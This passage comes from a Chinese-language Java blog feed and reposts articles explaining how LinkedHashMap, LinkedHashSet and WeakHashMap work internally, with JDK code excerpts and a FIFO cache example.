href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedHashMap_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedHashMap_base.png" alt="LinkedHashMap_base.png"></a></p><p>事实上<em>LinkedHashMap</em>是<em>HashMap</em>的直接子类，<strong>二者唯一的区别是LinkedHashMap在HashMap的基础上，采用双向链表（doubly-linked list）的形式将所有entry连接起来，这样是为保证元素的迭代顺序跟插入顺序相同</strong>。上图给出了<em>LinkedHashMap</em>的结构图，主体部分跟<em>HashMap</em>完全一样，多了<code>header</code>指向双向链表的头部（是一个哑元），<strong>该双向链表的迭代顺序就是entry的插入顺序</strong>。</p><p>除了可以保迭代历顺序，这种结构还有一个好处：<strong>迭代LinkedHashMap时不需要像HashMap那样遍历整个table，而只需要直接遍历header指向的双向链表即可</strong>，也就是说<em>LinkedHashMap</em>的迭代时间就只跟<code>entry</code>的个数相关，而跟<code>table</code>的大小无关。</p><p>有两个参数可以影响<em>LinkedHashMap</em>的性能：初始容量（inital capacity）和负载系数（load factor）。初始容量指定了初始<code>table</code>的大小，负载系数用来指定自动扩容的临界值。当<code>entry</code>的数量超过<code>capacity*load_factor</code>时，容器将自动扩容并重新哈希。对于插入元素较多的场景，将初始容量设大可以减少重新哈希的次数。</p><p>将对象放入到<em>LinkedHashMap</em>或<em>LinkedHashSet</em>中时，有两个方法需要特别关心：<code>hashCode()</code>和<code>equals()</code>。<strong>hashCode()方法决定了对象会被放到哪个bucket里，当多个对象的哈希值冲突时，equals()方法决定了这些对象是否是“同一个对象”</strong>。所以，如果要将自定义的对象放入到<code>LinkedHashMap</code>或<code>LinkedHashSet</code>中，需要<em>@Override</em><code>hashCode()</code>和<code>equals()</code>方法。</p><p>通过如下方式可以得到一个跟源<em>Map</em> <strong>迭代顺序</strong>一样的<em>LinkedHashMap</em>：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span>Map m<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Map copy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>出于性能原因，<em>LinkedHashMap</em>是非同步的（not synchronized），如果需要在多线程环境使用，需要程序员手动同步；或者通过如下方式将<em>LinkedHashMap</em>包装成（wrapped）同步的：</p><pre class=" language-java"><code class="language-java">Map m <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">synchronizedMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p><code>get(Object key)</code>方法根据指定的<code>key</code>值返回对应的<code>value</code>。该方法跟<code>HashMap.get()</code>方法的流程几乎完全一样，读者可自行<a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/6-HashSet%20and%20HashMap.md#get">参考前文</a>，这里不再赘述。</p><h2 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h2><p><code>put(K key, V value)</code>方法是将指定的<code>key, value</code>对添加到<code>map</code>里。该方法首先会对<code>map</code>做一次查找，看是否包含该元组，如果已经包含则直接返回，查找过程类似于<code>get()</code>方法；如果没有找到，则会通过<code>addEntry(int hash, K key, V value, int bucketIndex)</code>方法插入新的<code>entry</code>。</p><p>注意，这里的<strong>插入有两重含义</strong>：</p><blockquote><ol><li>从<code>table</code>的角度看，新的<code>entry</code>需要插入到对应的<code>bucket</code>里，当有哈希冲突时，采用头插法将新的<code>entry</code>插入到冲突链表的头部。</li><li>从<code>header</code>的角度看，新的<code>entry</code>需要插入到双向链表的尾部。</li></ol></blockquote><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedHashMap_addEntry.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedHashMap_addEntry.png" alt="LinkedHashMap_addEntry.png"></a></p><p><code>addEntry()</code>代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// LinkedHashMap.addEntry()</span><span class="token keyword">void</span> <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> threshold<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动扩容，并重新哈希</span>        hash <span class="token operator">=</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> key<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        bucketIndex <span class="token operator">=</span> hash <span class="token operator">&amp;</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// hash%table.length</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 1.在冲突链表头部插入新的entry</span>    HashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> old <span class="token operator">=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> old<span class="token punctuation">)</span><span class="token punctuation">;</span>    table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 2.在双向链表的尾部插入新的entry</span>    e<span class="token punctuation">.</span><span class="token function">addBefore</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>    size<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上述代码中用到了<code>addBefore()</code>方法将新<code>entry e</code>插入到双向链表头引用<code>header</code>的前面，这样<code>e</code>就成为双向链表中的最后一个元素。<code>addBefore()</code>的代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// LinkedHashMap.Entry.addBefor()，将this插入到existingEntry的前面</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addBefore</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> existingEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>    after  <span class="token operator">=</span> existingEntry<span class="token punctuation">;</span>    before <span class="token operator">=</span> existingEntry<span class="token punctuation">.</span>before<span class="token punctuation">;</span>    before<span class="token punctuation">.</span>after <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    after<span class="token punctuation">.</span>before <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上述代码只是简单修改相关<code>entry</code>的引用而已。</p><h2 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h2><p><code>remove(Object key)</code>的作用是删除<code>key</code>值对应的<code>entry</code>，该方法的具体逻辑是在<code>removeEntryForKey(Object key)</code>里实现的。<code>removeEntryForKey()</code>方法会首先找到<code>key</code>值对应的<code>entry</code>，然后删除该<code>entry</code>（修改链表的相应引用）。查找过程跟<code>get()</code>方法类似。</p><p>注意，这里的<strong>删除也有两重含义</strong>：</p><blockquote><ol><li>从<code>table</code>的角度看，需要将该<code>entry</code>从对应的<code>bucket</code>里删除，如果对应的冲突链表不空，需要修改冲突链表的相应引用。</li><li>从<code>header</code>的角度来看，需要将该<code>entry</code>从双向链表中删除，同时修改链表中前面以及后面元素的相应引用。</li></ol></blockquote><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/LinkedHashMap_removeEntryForKey.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/LinkedHashMap_removeEntryForKey.png" alt="LinkedHashMap_removeEntryForKey.png"></a></p><p><code>removeEntryForKey()</code>对应的代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// LinkedHashMap.removeEntryForKey()，删除key值对应的entry</span><span class="token keyword">final</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token function">removeEntryForKey</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// hash&amp;(table.length-1)</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> prev <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 得到冲突链表</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> prev<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 遍历冲突链表</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        Object k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 找到要删除的entry</span>            modCount<span class="token operator">++</span><span class="token punctuation">;</span> size<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 1. 将e从对应bucket的冲突链表中删除</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prev <span class="token operator">==</span> e<span class="token punctuation">)</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">;</span>            <span class="token keyword">else</span> prev<span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 2. 将e从双向链表中删除</span>            e<span class="token punctuation">.</span>before<span class="token punctuation">.</span>after <span class="token operator">=</span> e<span class="token punctuation">.</span>after<span class="token punctuation">;</span>            e<span class="token punctuation">.</span>after<span class="token punctuation">.</span>before <span class="token operator">=</span> e<span class="token punctuation">.</span>before<span class="token punctuation">;</span>            <span class="token keyword">return</span> e<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        prev <span class="token operator">=</span> e<span class="token punctuation">;</span> e <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h1><p>前面已经说过<em>LinkedHashSet</em>是对<em>LinkedHashMap</em>的简单包装，对<em>LinkedHashSet</em>的函数调用都会转换成合适的<em>LinkedHashMap</em>方法，因此<em>LinkedHashSet</em>的实现非常简单，这里不再赘述。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LinkedHashSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span>    <span class="token keyword">extends</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span>    <span class="token keyword">implements</span> <span class="token class-name">Set</span><span class="token operator">&lt;</span>E<span class="token operator">></span><span class="token punctuation">,</span> Cloneable<span class="token punctuation">,</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// LinkedHashSet里面有一个LinkedHashMap</span>    <span class="token keyword">public</span> <span class="token function">LinkedHashSet</span><span class="token punctuation">(</span><span class="token keyword">int</span> initialCapacity<span class="token punctuation">,</span> <span class="token keyword">float</span> loadFactor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>initialCapacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//简单的方法转换</span>        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token operator">==</span>null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><h1 id="LinkedHashMap经典用法"><a href="#LinkedHashMap经典用法" class="headerlink" title="LinkedHashMap经典用法"></a>LinkedHashMap经典用法</h1><p><em>LinkedHashMap</em>除了可以保证迭代顺序外，还有一个非常有用的用法：可以轻松实现一个采用了FIFO替换策略的缓存。具体说来，LinkedHashMap有一个子类方法<code>protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest)</code>，该方法的作用是告诉Map是否要删除“最老”的Entry，所谓最老就是当前Map中最早插入的Entry，如果该方法返回<code>true</code>，最老的那个元素就会被删除。在每次插入新元素的之后LinkedHashMap会自动询问removeEldestEntry()是否要删除最老的元素。这样只需要在子类中重载该方法，当元素个数超过一定数量时让removeEldestEntry()返回true，就能够实现一个固定大小的FIFO策略的缓存。示例代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** 一个固定大小的FIFO替换策略的缓存 */</span><span class="token keyword">class</span> <span class="token class-name">FIFOCache</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> cacheSize<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">FIFOCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> cacheSize<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cacheSize <span class="token operator">=</span> cacheSize<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 当Entry个数超过cacheSize时，删除最老的Entry</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">removeEldestEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> eldest<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> cacheSize<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/7-LinkedHashSet%20and%20LinkedHashMap.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WeakHashMap</title>
      <link href="/2019/01/21/java/java-rong-qi/weakhashmap/"/>
      <url>/2019/01/21/java/java-rong-qi/weakhashmap/</url>
      
        <content type="html"><![CDATA[<h1 id="WeakHashMap"><a href="#WeakHashMap" class="headerlink" title="WeakHashMap"></a>WeakHashMap</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>在Java集合框架系列文章的最后，笔者打算介绍一个特殊的成员：<em>WeakHashMap</em>，从名字可以看出它是某种 <em>Map</em>。它的特殊之处在于 <em>WeakHashMap</em> 里的<code>entry</code>可能会被GC自动删除，即使程序员没有调用<code>remove()</code>或者<code>clear()</code>方法。</p><p>更直观的说，当使用 <em>WeakHashMap</em> 时，即使没有显示的添加或删除任何元素，也可能发生如下情况：</p><blockquote><ul><li>调用两次<code>size()</code>方法返回不同的值；</li><li>两次调用<code>isEmpty()</code>方法，第一次返回<code>false</code>，第二次返回<code>true</code>；</li><li>两次调用<code>containsKey()</code>方法，第一次返回<code>true</code>，第二次返回<code>false</code>，尽管两次使用的是同一个<code>key</code>；</li><li>两次调用<code>get()</code>方法，第一次返回一个<code>value</code>，第二次返回<code>null</code>，尽管两次使用的是同一个对象。</li></ul></blockquote><p>遇到这么奇葩的现象，你是不是觉得使用者一定会疯掉？其实不然，<strong>WeekHashMap 的这个特点特别适用于需要缓存的场景</strong>。在缓存场景下，由于内存是有限的，不能缓存所有对象；对象缓存命中可以提高系统效率，但缓存MISS也不会造成错误，因为可以通过计算重新得到。</p><p>要明白 <em>WeekHashMap</em> 的工作原理，还需要引入一个概念：<strong>弱引用（WeakReference）</strong>。我们都知道Java中内存是通过GC自动管理的，GC会在程序运行过程中自动判断哪些对象是可以被回收的，并在合适的时机进行内存释放。GC判断某个对象是否可被回收的依据是，<strong>是否有有效的引用指向该对象</strong>。如果没有有效引用指向该对象（基本意味着不存在访问该对象的方式），那么该对象就是可回收的。这里的<strong>“有效引用”</strong>并不包括<strong>弱引用</strong>。也就是说，<strong>虽然弱引用可以用来访问对象，但进行垃圾回收时弱引用并不会被考虑在内，仅有弱引用指向的对象仍然会被GC回收</strong>。</p><p><em>WeakHashMap</em> 内部是通过弱引用来管理<code>entry</code>的，弱引用的特性对应到 <em>WeakHashMap</em> 上意味着什么呢？<strong>将一对key, value放入到 WeakHashMap 里并不能避免该key值被GC回收，除非在 WeakHashMap 之外还有对该key的强引用</strong>。</p><p>关于强引用，弱引用等概念以后再具体讲解，这里只需要知道Java中引用也是分种类的，并且不同种类的引用对GC的影响不同就够了。</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>WeakHashMap的存储结构类似于HashMap，读者可自行<a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/6-HashSet%20and%20HashMap.md">参考前文</a>，这里不再赘述。</p><p>关于强弱引用的管理方式，博主将会另开专题单独讲解。</p><h1 id="Weak-HashSet"><a href="#Weak-HashSet" class="headerlink" title="Weak HashSet?"></a>Weak HashSet?</h1><p>如果你看过前几篇关于 <em>Map</em> 和 <em>Set</em> 的讲解，一定会问：既然有 <em>WeekHashMap</em>，是否有 <em>WeekHashSet</em> 呢？答案是没有:( 。不过Java <em>Collections</em>工具类给出了解决方案，<code>Collections.newSetFromMap(Map&lt;E,Boolean&gt; map)</code>方法可以将任何 <em>Map</em>包装成一个<em>Set</em>。通过如下方式可以快速得到一个 <em>Weak HashSet</em>：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 将WeakHashMap包装成一个Set</span>Set<span class="token operator">&lt;</span>Object<span class="token operator">></span> weakHashSet <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">newSetFromMap</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name">WeakHashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Boolean<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>不出你所料，<code>newSetFromMap()</code>方法只是对传入的 <em>Map</em>做了简单包装：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// Collections.newSetFromMap()用于将任何Map包装成一个Set</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>E<span class="token operator">></span> Set<span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token function">newSetFromMap</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>E<span class="token punctuation">,</span> Boolean<span class="token operator">></span> map<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SetFromMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SetFromMap</span><span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">AbstractSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span>    <span class="token keyword">implements</span> <span class="token class-name">Set</span><span class="token operator">&lt;</span>E<span class="token operator">></span><span class="token punctuation">,</span> Serializable<span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Map<span class="token operator">&lt;</span>E<span class="token punctuation">,</span> Boolean<span class="token operator">></span> m<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// The backing map</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> Set<span class="token operator">&lt;</span>E<span class="token operator">></span> s<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// Its keySet</span>    <span class="token function">SetFromMap</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>E<span class="token punctuation">,</span> Boolean<span class="token operator">></span> map<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>map<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Map is non-empty"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m <span class="token operator">=</span> map<span class="token punctuation">;</span>        s <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token punctuation">{</span>        m<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token punctuation">{</span> <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span> <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">contains</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">remove</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span>   <span class="token punctuation">{</span> <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> Boolean<span class="token punctuation">.</span>TRUE<span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> Iterator<span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span> <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span> <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toArray</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">)</span>     <span class="token punctuation">{</span> <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span> <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token punctuation">{</span> <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span>   <span class="token punctuation">{</span> <span class="token keyword">return</span> o <span class="token operator">==</span> <span class="token keyword">this</span> <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">containsAll</span><span class="token punctuation">(</span>Collection<span class="token 